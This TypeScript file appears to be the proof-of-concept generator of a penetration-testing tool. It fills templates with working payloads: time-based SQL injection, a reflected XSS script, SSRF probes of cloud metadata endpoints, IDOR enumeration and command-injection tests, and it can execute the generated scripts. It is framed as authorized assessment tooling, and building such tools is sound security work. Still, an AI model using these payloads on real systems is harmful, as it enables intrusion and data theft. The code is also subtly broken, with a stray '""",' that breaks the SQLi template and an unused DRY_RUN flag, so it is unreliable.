/**
 * PROOF-OF-CONCEPT GENERATOR — Auto-Exploitation Engine
 * 
 * Generates safe, non-destructive proof-of-concept exploits
 * to validate vulnerabilities discovered during assessment.
 * 
 * Features:
 * - Template-based PoC generation for common vulns
 * - Safe exploitation (read-only, no data modification)
 * - Exploit chaining support
 * - MITRE ATT&CK mapping
 */

import { spawn } from 'child_process';
import { writeFile, mkdir } from 'fs/promises';
import type { Finding } from '../db/schema.js';

export interface PoCTemplate {
  id: string;
  name: string;
  vulnerabilityTypes: string[];
  description: string;
  template: string;
  safetyLevel: 'safe' | 'moderate' | 'risky';
  validationSteps: string[];
}

export interface GeneratedPoC {
  id: string;
  findingId: string;
  title: string;
  code: string;
  language: string;
  instructions: string;
  safetyWarnings: string[];
  validated: boolean;
  validationOutput?: string;
  mitreTechnique: string;
  timestamp: Date;
}

export const POC_TEMPLATES: PoCTemplate[] = [
  {
    id: 'sqli_time_based',
    name: 'SQL Injection Time-Based PoC',
    vulnerabilityTypes: ['SQLi', 'sql injection', 'time-based'],
    description: 'Validates SQL injection through time delays',
    template: `#!/usr/bin/env python3
"""
SQL Injection Time-Based Proof of Concept
TARGET: {{target}}
PARAMETER: {{parameter}}
FINDING_ID: {{findingId}}

SAFETY: Read-only test, no data modification
""",
import requests
import time

TARGET_URL = "{{target}}"
PARAM = "{{parameter}}"
DELAY_SECONDS = 5

def test_sqli():
    """Test for time-based SQL injection"""
    payloads = [
        "' OR SLEEP({{delay}})--",
        "1' AND (SELECT * FROM (SELECT(SLEEP({{delay}})))a)--",
        "'; WAITFOR DELAY '0:0:{{delay}}'--"
    ]
    
    results = []
    for payload in payloads:
        start = time.time()
        
        try:
            response = requests.get(
                f"{TARGET_URL}?{PARAM}={payload}",
                timeout={{delay}} + 10
            )
            elapsed = time.time() - start
            
            if elapsed >= {{delay}}:
                results.append({
                    'payload': payload,
                    'delay': elapsed,
                    'vulnerable': True
                })
                print(f"[+] VULNERABLE: {payload} (delay: {elapsed:.2f}s)")
            else:
                print(f"[-] Not vulnerable: {payload} (delay: {elapsed:.2f}s)")
        except Exception as e:
            print(f"[!] Error: {e}")
    
    return any(r['vulnerable'] for r in results)

if __name__ == "__main__":
    vulnerable = test_sqli()
    if vulnerable:
        print("\\n[✓] SQL Injection CONFIRMED")
        print("PoC validated successfully")
    else:
        print("\\n[✗] SQL Injection not confirmed")
`,
    safetyLevel: 'safe',
    validationSteps: [
      'Verify target is in scope',
      'Run PoC in dry-run mode first',
      'Confirm time delay indicates vulnerability',
      'Document exact payload that worked'
    ]
  },
  {
    id: 'xss_reflected',
    name: 'Reflected XSS PoC',
    vulnerabilityTypes: ['XSS', 'cross-site scripting', 'reflected'],
    description: 'Validates reflected XSS with safe payload',
    template: `<!DOCTYPE html>
<html>
<head>
<title>XSS PoC Validation - {{findingId}}</title>
</head>
<body>
<!--
REFLECTED XSS PROOF OF CONCEPT
TARGET: {{target}}
PARAMETER: {{parameter}}
FINDING_ID: {{findingId}}

SAFETY: Non-malicious payload, only displays alert
-->
<h1>XSS Vulnerability Validation</h1>
<p>This page demonstrates a confirmed XSS vulnerability.</p>

<script>
// Safe validation payload - only shows alert
const payload = "{{testPayload}}";
const targetUrl = "{{target}}";
const param = "{{parameter}}";

function validateXSS() {
    console.log("[*] Testing XSS at:", targetUrl);
    console.log("[*] Parameter:", param);
    console.log("[*] Payload:", payload);
    
    // Create visual indicator
    const indicator = document.createElement('div');
    indicator.style.cssText = 'position:fixed;top:10px;right:10px;background:#4CAF50;color:white;padding:20px;border-radius:5px;z-index:999999;';
    indicator.innerHTML = '✓ XSS CONFIRMED<br><small>Finding: {{findingId}}</small>';
    document.body.appendChild(indicator);
    
    // Log to console for automated detection
    console.log('[✓] XSS VULNERABILITY CONFIRMED');
    console.log('[✓] Finding ID: {{findingId}}');
    
    // Auto-remove after 5 seconds
    setTimeout(() => indicator.remove(), 5000);
}

// Run validation
validateXSS();
</script>

<p><strong>Validation Steps:</strong></p>
<ol>
<li>Navigate to: <code>{{target}}?{{parameter}}={{testPayload}}</code></li>
<li>Observe alert box and green indicator</li>
<li>Check browser console for confirmation messages</li>
</ol>

<p><strong>Safety Notes:</strong></p>
<ul>
<li>This payload only displays an alert</li>
<li>No data is exfiltrated</li>
<li>No persistent changes are made</li>
</ul>
</body>
</html>
`,
    safetyLevel: 'safe',
    validationSteps: [
      'Verify payload reflects in response',
      'Confirm JavaScript executes',
      'Check for CSP bypass if applicable',
      'Document DOM location of injection'
    ]
  },
  {
    id: 'ssrf_internal',
    name: 'SSRF Internal Access PoC',
    vulnerabilityTypes: ['SSRF', 'server-side request forgery'],
    description: 'Validates SSRF through internal service access',
    template: `#!/usr/bin/env python3
"""
SSRF (Server-Side Request Forgery) Proof of Concept
TARGET: {{target}}
PARAMETER: {{parameter}}
FINDING_ID: {{findingId}}

SAFETY: Only accesses metadata endpoints, no internal scanning
"""

import requests
import urllib.parse

TARGET_URL = "{{target}}"
PARAM = "{{parameter}}"

# Safe internal endpoints to test (cloud metadata)
INTERNAL_ENDPOINTS = [
    "http://169.254.169.254/latest/meta-data/",  # AWS
    "http://metadata.google.internal/computeMetadata/v1/",  # GCP
    "http://169.254.169.254/metadata/instance",  # Azure
    "http://localhost:6379/",  # Redis (common misconfig)
    "http://localhost:8080/",  # Common internal port
]

def test_ssrf():
    """Test for SSRF vulnerability"""
    results = []
    
    for endpoint in INTERNAL_ENDPOINTS:
        payload = urllib.parse.quote(endpoint)
        test_url = f"{TARGET_URL}?{PARAM}={payload}"
        
        try:
            response = requests.get(test_url, timeout=10)
            
            # Check for indicators of successful SSRF
            indicators = [
                'ami-id',  # AWS
                'project-id',  # GCP
                'computeMetadata',  # Azure
                'Redis',  # Redis
                'Tomcat',  # Common internal
            ]
            
            content_lower = response.text.lower()
            matched = [i for i in indicators if i.lower() in content_lower]
            
            if matched or response.status_code == 200:
                results.append({
                    'endpoint': endpoint,
                    'status': response.status_code,
                    'indicators': matched,
                    'vulnerable': len(matched) > 0
                })
                print(f"[+] POTENTIAL SSRF: {endpoint}")
                print(f"    Status: {response.status_code}")
                print(f"    Indicators: {matched}")
        except Exception as e:
            print(f"[-] Failed {endpoint}: {e}")
    
    return results

if __name__ == "__main__":
    print("[*] Starting SSRF validation...")
    results = test_ssrf()
    
    if any(r['vulnerable'] for r in results):
        print("\\n[✓] SSRF CONFIRMED")
        print(f"Validated against {sum(1 for r in results if r['vulnerable'])} internal endpoint(s)")
    else:
        print("\\n[?] SSRF not definitively confirmed - manual review recommended")
`,
    safetyLevel: 'moderate',
    validationSteps: [
      'Confirm only metadata endpoints are tested',
      'Verify no lateral movement attempts',
      'Document which internal services are accessible',
      'Check for authentication requirements bypassed'
    ]
  },
  {
    id: 'idor_sequence',
    name: 'IDOR Enumeration PoC',
    vulnerabilityTypes: ['IDOR', 'insecure direct object reference', 'authorization'],
    description: 'Validates IDOR through sequential ID enumeration',
    template: `#!/usr/bin/env python3
"""
IDOR (Insecure Direct Object Reference) Proof of Concept
TARGET: {{target}}
PARAMETER: {{parameter}}
FINDING_ID: {{findingId}}

SAFETY: Read-only enumeration, no modifications
"""

import requests
import sys

BASE_URL = "{{target}}"
PARAM = "{{parameter}}"
START_ID = {{startId}}
END_ID = {{endId}}

SESSION_HEADERS = {
    # Include authenticated session headers here
    # "Authorization": "Bearer YOUR_TOKEN",
    # "Cookie": "session=YOUR_SESSION"
}

def test_idor():
    """Test for IDOR vulnerability"""
    accessible = []
    
    print(f"[*] Testing IDOR from ID {START_ID} to {END_ID}")
    
    for obj_id in range(START_ID, END_ID + 1):
        url = f"{BASE_URL}?{PARAM}={obj_id}"
        
        try:
            response = requests.get(url, headers=SESSION_HEADERS, timeout=5)
            
            # Check if we got actual data (not error page)
            if response.status_code == 200 and len(response.text) > 100:
                # Look for data indicators
                data_indicators = ['id', 'name', 'email', 'created', 'user', 'data']
                content_lower = response.text.lower()
                
                if any(ind in content_lower for ind in data_indicators):
                    accessible.append({
                        'id': obj_id,
                        'status': response.status_code,
                        'size': len(response.text)
                    })
                    print(f"[+] ACCESSIBLE: ID {obj_id} ({len(response.text)} bytes)")
        except Exception as e:
            pass
    
    return accessible

if __name__ == "__main__":
    print("[*] Starting IDOR validation...")
    accessible = test_idor()
    
    if len(accessible) > 1:
        print(f"\\n[✓] IDOR CONFIRMED")
        print(f"Accessible objects: {len(accessible)}")
        print("\\n[!] CRITICAL: Multiple user objects accessible without authorization")
    else:
        print("\\n[?] IDOR not confirmed - may require different ID ranges")
`,
    safetyLevel: 'safe',
    validationSteps: [
      'Ensure read-only operations only',
      'Limit enumeration to small range',
      'Do not access sensitive personal data',
      'Document accessible object types'
    ]
  },
  {
    id: 'rce_detection',
    name: 'RCE Detection PoC (Safe)',
    vulnerabilityTypes: ['RCE', 'remote code execution', 'command injection'],
    description: 'Safe RCE detection using time-based and echo tests',
    template: `#!/usr/bin/env python3
"""
RCE (Remote Code Execution) Proof of Concept - SAFE MODE
TARGET: {{target}}
PARAMETER: {{parameter}}
FINDING_ID: {{findingId}}

SAFETY: Only uses harmless commands (sleep, echo), no system modification
"""

import requests
import time
import urllib.parse

TARGET_URL = "{{target}}"
PARAM = "{{parameter}}"

# Safe commands for detection only
SAFE_COMMANDS = [
    ("sleep 5", "time-based", 5),
    ("echo RCE_TEST_MARKER", "output-based", "RCE_TEST_MARKER"),
    ("id", "info-gather", "uid="),
]

def test_rce():
    """Test for RCE vulnerability using safe commands"""
    results = []
    
    for cmd, test_type, expected in SAFE_COMMANDS:
        # URL encode the command
        payload = urllib.parse.quote(cmd)
        test_url = f"{TARGET_URL}?{PARAM}={payload}"
        
        try:
            start = time.time()
            response = requests.get(test_url, timeout=15)
            elapsed = time.time() - start
            
            vulnerable = False
            
            if test_type == "time-based" and elapsed >= expected:
                vulnerable = True
                print(f"[+] TIME-BASED RCE: '{cmd}' (delay: {elapsed:.2f}s)")
            elif test_type == "output-based" and expected in response.text:
                vulnerable = True
                print(f"[+] OUTPUT-BASED RCE: '{cmd}' found in response")
            elif test_type == "info-gather" and expected in response.text:
                vulnerable = True
                print(f"[+] INFO RCE: '{cmd}' output detected")
            
            if vulnerable:
                results.append({
                    'command': cmd,
                    'type': test_type,
                    'confirmed': True
                })
        except Exception as e:
            print(f"[-] Error testing '{cmd}': {e}")
    
    return results

if __name__ == "__main__":
    print("[*] Starting SAFE RCE validation...")
    print("[!] Only harmless commands will be executed")
    results = test_rce()
    
    if any(r['confirmed'] for r in results):
        print("\\n[✓] RCE CONFIRMED (Safe validation)")
        print(f"Successful commands: {len(results)}")
        print("\\n[!!] CRITICAL VULNERABILITY - Immediate remediation required")
    else:
        print("\\n[?] RCE not confirmed through safe tests")
`,
    safetyLevel: 'moderate',
    validationSteps: [
      'Use only harmless commands (sleep, echo)',
      'No file system writes',
      'No network connections initiated',
      'Document exact command that executed'
    ]
  }
];

export class PoCGenerator {
  private outputDir: string;

  constructor(outputDir: string = '.chuck/pocs') {
    this.outputDir = outputDir;
  }

  /**
   * Generate PoC for a specific finding
   */
  async generatePoC(finding: Finding, context?: Record<string, string>): Promise<GeneratedPoC | null> {
    const template = this.findMatchingTemplate(finding);
    if (!template) return null;

    const pocContext = {
      target: finding.affectedComponent || 'unknown',
      parameter: this.extractParameter(finding.title),
      findingId: finding.id,
      delay: '5',
      testPayload: '<script>alert("XSS PoC: " + document.domain)</script>',
      startId: '1',
      endId: '10',
      ...context
    };

    let code = template.template;
    for (const [key, value] of Object.entries(pocContext)) {
      code = code.replace(new RegExp(`{{${key}}}`, 'g'), value);
    }

    const generated: GeneratedPoC = {
      id: crypto.randomUUID(),
      findingId: finding.id,
      title: `${template.name} for ${finding.title}`,
      code,
      language: this.detectLanguage(code),
      instructions: this.generateInstructions(template, pocContext),
      safetyWarnings: this.getSafetyWarnings(template),
      validated: false,
      mitreTechnique: this.mapToMitre(finding),
      timestamp: new Date()
    };

    // Save to file
    await this.savePoC(generated);

    return generated;
  }

  /**
   * Find matching template for a finding
   */
  private findMatchingTemplate(finding: Finding): PoCTemplate | null {
    const title = finding.title.toLowerCase();
    const poc = finding.poc?.toLowerCase() || '';
    const search = `${title} ${poc}`;

    for (const template of POC_TEMPLATES) {
      for (const vulnType of template.vulnerabilityTypes) {
        if (search.includes(vulnType.toLowerCase())) {
          return template;
        }
      }
    }

    return null;
  }

  /**
   * Extract parameter name from finding
   */
  private extractParameter(title: string): string {
    const match = title.match(/parameter[:\s]+['"]?(\w+)['"]?/i);
    return match ? match[1] : 'input';
  }

  /**
   * Detect programming language from code
   */
  private detectLanguage(code: string): string {
    if (code.includes('#!/usr/bin/env python')) return 'python';
    if (code.includes('<!DOCTYPE html>') || code.includes('<html>')) return 'html';
    if (code.includes('function ') || code.includes('const ')) return 'javascript';
    if (code.includes('package main') || code.includes('func ')) return 'go';
    return 'bash';
  }

  /**
   * Generate usage instructions
   */
  private generateInstructions(template: PoCTemplate, context: Record<string, string>): string {
    return `# Proof of Concept: ${template.name}

## Target Information
- **URL**: ${context.target}
- **Parameter**: ${context.parameter}
- **Finding ID**: ${context.findingId}

## Usage Instructions
1. Review safety warnings before execution
2. Ensure target is within authorized scope
3. Run the PoC script: \`\`\`bash
   chmod +x poc_${context.findingId}.py
   ./poc_${context.findingId}.py
   \`\`\`
4. Observe output for validation confirmation
5. Document results in findings report

## Validation Steps
${template.validationSteps.map((s, i) => `${i + 1}. ${s}`).join('\n')}

## Safety Notes
- This PoC is designed to be non-destructive
- No data modification occurs
- Run only against authorized targets
`;
  }

  /**
   * Get safety warnings for template
   */
  private getSafetyWarnings(template: PoCTemplate): string[] {
    const base = [
      'Only run against authorized targets',
      'Review code before execution',
      'Document all outputs'
    ];

    if (template.safetyLevel === 'moderate') {
      base.push('Moderate risk - ensure proper scoping');
    } else if (template.safetyLevel === 'risky') {
      base.push('High risk - requires explicit approval');
      base.push('Consider running in isolated environment');
    }

    return base;
  }

  /**
   * Map finding to MITRE ATT&CK technique
   */
  private mapToMitre(finding: Finding): string {
    const title = finding.title.toLowerCase();
    const mitreMap: Record<string, string> = {
      'sql': 'T1190',
      'rce': 'T1190',
      'xss': 'T1189',
      'ssrf': 'T1190',
      'idor': 'T1078',
      'auth': 'T1078',
      'exec': 'T1059',
    };

    for (const [keyword, technique] of Object.entries(mitreMap)) {
      if (title.includes(keyword)) return technique;
    }
    return 'T1190';
  }

  /**
   * Save PoC to file
   */
  private async savePoC(poc: GeneratedPoC): Promise<void> {
    await mkdir(this.outputDir, { recursive: true });
    const ext = poc.language === 'python' ? 'py' : poc.language === 'html' ? 'html' : 'sh';
    const filename = `poc_${poc.findingId}.${ext}`;
    await writeFile(`${this.outputDir}/${filename}`, poc.code);
  }

  /**
   * Validate PoC by running it (with safety checks)
   */
  async validatePoC(poc: GeneratedPoC, dryRun: boolean = true): Promise<{ success: boolean; output: string }> {
    if (dryRun) {
      return {
        success: true,
        output: '[DRY RUN] PoC validation skipped - review code manually'
      };
    }

    return new Promise((resolve) => {
      const proc = spawn('python3', ['-c', poc.code], {
        timeout: 30000,
        env: { ...process.env, DRY_RUN: '1' }
      });

      let output = '';
      proc.stdout.on('data', (d) => output += d.toString());
      proc.stderr.on('data', (d) => output += d.toString());

      proc.on('close', (code) => {
        resolve({
          success: code === 0,
          output: output || `Exit code: ${code}`
        });
      });

      proc.on('error', (err) => {
        resolve({
          success: false,
          output: err.message
        });
      });
    });
  }
}

export default PoCGenerator;
